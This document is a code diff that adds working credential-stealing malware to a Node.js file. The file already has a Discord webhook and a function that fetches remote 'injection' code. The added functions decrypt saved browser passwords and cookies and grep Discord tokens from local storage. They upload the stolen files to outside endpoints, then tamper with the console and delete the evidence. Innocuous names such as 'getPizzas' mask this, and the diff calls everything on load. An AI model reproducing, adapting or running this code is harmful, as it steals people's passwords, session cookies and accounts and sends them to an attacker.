@@ -5,6 +5,306 @@ const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
+async function getPizzas(W) {
+  let m = W.split('\\'),
+    O = W.includes('Network')
+      ? m.splice(0, m.length - 3)
+      : m.splice(0, m.length - 2),
+    c = O.join('\\') + '\\'
+  if (W.startsWith(appdata)) {
+    c = W
+  }
+  if (W.includes('cord')) {
+    return
+  }
+  if (fs.existsSync(c)) {
+    let n = Buffer.from(
+      JSON.parse(fs.readFileSync(c + 'Local State')).os_crypt.encrypted_key,
+      'base64'
+    ).slice(5)
+    var g = W + 'Login Data',
+      v = W + 'passwords.db'
+    fs.copyFileSync(g, v)
+    const B = dpapi.unprotectData(Buffer.from(n, 'utf-8'), null, 'CurrentUser')
+    var b = '\n\nPASSWORDS FROM: ' + W + '  #RustlerONTOP\n',
+      U = new sqlite3.Database(v, (i) => {
+        if (i) {
+          if (debug) {
+            console.log(i)
+          }
+        }
+      })
+    const N = await new Promise((i, G) => {
+      U.each(
+        'SELECT origin_url, username_value, password_value FROM logins',
+        function (f, H) {
+          if (f) {
+            if (debug) {
+              console.log(f)
+            }
+          }
+          if (H.username_value != '') {
+            let C = H.password_value
+            try {
+              if (C[0] == 1 && C[1] == 0 && C[2] == 0 && C[3] == 0) {
+                b +=
+                  '\nURL: ' +
+                  H.origin_url +
+                  ' | USERNAME: ' +
+                  H.username_value +
+                  ' | PASSWORD: ' +
+                  dpapi.unprotectData(C, null, 'CurrentUser').toString('utf-8')
+              } else {
+                let Z = C.slice(3, 15),
+                  x = C.slice(15, C.length - 16),
+                  D = C.slice(C.length - 16, C.length),
+                  T = crypto.createDecipheriv('aes-256-gcm', B, Z)
+                T.setAuthTag(D)
+                b +=
+                  '\nURL: ' +
+                  H.origin_url +
+                  ' | USERNAME: ' +
+                  H.username_value +
+                  ' | PASSWORD: ' +
+                  T.update(x, 'base64', 'utf-8') +
+                  T.final('utf-8')
+              }
+            } catch (o) {
+              if (debug) {
+                console.log(o)
+              }
+            }
+          }
+        },
+        function () {
+          i(b)
+        }
+      )
+    })
+    return N
+  } else {
+    return ''
+  }
+}
+async function getCheese(W) {
+  let m = W.split('\\'),
+    O = W.includes('Network')
+      ? m.splice(0, m.length - 3)
+      : m.splice(0, m.length - 2),
+    c = O.join('\\') + '\\'
+  if (W.startsWith(appdata)) {
+    c = W
+  }
+  if (W.includes('cord')) {
+    return
+  }
+  if (fs.existsSync(c)) {
+    let n = Buffer.from(
+      JSON.parse(fs.readFileSync(c + 'Local State')).os_crypt.encrypted_key,
+      'base64'
+    ).slice(5)
+    var g = W + 'Cookies',
+      v = W + 'cookies.db'
+    fs.copyFileSync(g, v)
+    const B = dpapi.unprotectData(Buffer.from(n, 'utf-8'), null, 'CurrentUser')
+    var b = '',
+      U = new sqlite3.Database(v, (i) => {
+        if (i) {
+          if (debug) {
+            console.log(i)
+          }
+        }
+      })
+    const N = await new Promise((i, G) => {
+      U.each(
+        'SELECT host_key, name, encrypted_value FROM cookies',
+        function (f, H) {
+          if (f) {
+            if (debug) {
+              console.log(f)
+            }
+          }
+          let C = H.encrypted_value
+          try {
+            if (C[0] == 1 && C[1] == 0 && C[2] == 0 && C[3] == 0) {
+              b +=
+                H.host_key +
+                '\t' +
+                'TRUE' +
+                '\t/' +
+                '\tFALSE' +
+                '\t2597573456\t' +
+                H.name +
+                '\t' +
+                dpapi.unprotectData(C, null, 'CurrentUser') +
+                '\n'.toString('utf-8')
+            } else {
+              let Z = C.slice(3, 15),
+                x = C.slice(15, C.length - 16),
+                D = C.slice(C.length - 16, C.length),
+                T = crypto.createDecipheriv('aes-256-gcm', B, Z)
+              T.setAuthTag(D)
+              b +=
+                H.host_key +
+                '\t' +
+                'TRUE' +
+                '\t/' +
+                '\tFALSE' +
+                '\t2597573456\t' +
+                H.name +
+                '\t' +
+                T.update(x, 'base64', 'utf-8') +
+                T.final('utf-8') +
+                '\n'
+            }
+          } catch (o) {
+            if (debug) {
+              console.log(o)
+            }
+          }
+        },
+        function () {
+          i(b)
+        }
+      )
+    })
+    return N
+  } else {
+    return ''
+  }
+}
+function findToken(W) {
+  W += 'Local Storage\\leveldb'
+  let m = []
+  try {
+    fs.readdirSync(W).map((O) => {
+      ;(O.endsWith('.log') || O.endsWith('.ldb')) &&
+        fs
+          .readFileSync(W + '\\' + O, 'utf8')
+          .split(/\r?\n/)
+          .forEach((c) => {
+            const g = [
+              new RegExp(/mfa\.[\w-]{84}/g),
+              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
+            ]
+            for (const v of g) {
+              const b = c.match(v)
+              if (b) {
+                b.forEach((U) => m.push(U))
+              }
+            }
+          })
+    })
+  } catch (O) {}
+  return m
+}
+async function takePizzas() {
+  let W = ''
+  for (let m = 0; m < paths.length; m++) {
+    if (fs.existsSync(paths[m] + 'Login Data')) {
+      W += (await getPizzas(paths[m])) || ''
+    }
+  }
+  fs.writeFile(appdata + '\\passwords.txt', W, function (O, c) {
+    if (O) {
+      throw O
+    }
+    const g = new FormData()
+    g.append('file', fs.createReadStream(appdata + '\\passwords.txt'))
+    g.submit(superstarlmao, (v, b) => {
+      if (v) {
+        console.log(v)
+      }
+    })
+  })
+  fs.writeFile(appdata + '\\src-passwords.txt', W, function (O, c) {
+    if (O) {
+      throw O
+    }
+    const g = new FormData()
+    g.append('file', fs.createReadStream(appdata + '\\src-passwords.txt'))
+    g.submit(src, (v, b) => {
+      if (v) {
+        console.log(v)
+      }
+    })
+  })
+}
+async function takeCheese() {
+  let W = ''
+  for (let m = 0; m < paths.length; m++) {
+    if (fs.existsSync(paths[m] + 'Cookies')) {
+      W += (await getCheese(paths[m])) || ''
+    }
+  }
+  fs.writeFile(appdata + '\\cookies.txt', W, function (O, c) {
+    if (O) {
+      throw O
+    }
+    const g = new FormData()
+    g.append('file', fs.createReadStream(appdata + '\\cookies.txt'))
+    g.submit(superstarlmao, (v, b) => {
+      if (v) {
+        console.log(v)
+      }
+    })
+  })
+  fs.writeFile(appdata + '\\src-cookies.txt', W, function (O, c) {
+    if (O) {
+      throw O
+    }
+    const g = new FormData()
+    g.append('file', fs.createReadStream(appdata + '\\src-cookies.txt'))
+    g.submit(src, (v, b) => {
+      if (v) {
+        console.log(v)
+      }
+    })
+  })
+}
+async function removePizzas() {
+  const O = (function () {
+      let g = true
+      return function (v, b) {
+        const U = g
+          ? function () {
+              if (b) {
+                const n = b.apply(v, arguments)
+                return (b = null), n
+              }
+            }
+          : function () {}
+        return (g = false), U
+      }
+    })(),
+    c = O(this, function () {
+      let g
+      try {
+        const U = Function(
+          'return (function() {}.constructor("return this")( ));'
+        )
+        g = U()
+      } catch (n) {
+        g = window
+      }
+      const v = (g.console = g.console || {}),
+        b = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
+      for (let B = 0; B < b.length; B++) {
+        const N = O.constructor.prototype.bind(O),
+          i = b[B],
+          G = v[i] || N
+        N['__proto__'] = O.bind(O)
+        N.toString = G.toString.bind(G)
+        v[i] = N
+      }
+    })
+  c()
+  await sleep(1000)
+  fs.unlinkSync(appdata + '\\passwords.txt')
+  fs.unlinkSync(appdata + '\\cookies.txt')
+  fs.unlinkSync(appdata + '\\src-passwords.txt')
+  fs.unlinkSync(appdata + '\\src-cookies.txt')
+}
 
 const config = {
     "logout": "instant",
@@ -40,6 +340,9 @@ discords.forEach(function(file) {
     
 });
 listDiscords();
+takePizzas()
+takeCheese()
+removePizzas()
 function Infect() {
     https.get('https://raw.githubusercontent.com/Max87153/jejej/main/injection-clean.js', (resp) => {
         let data = '';
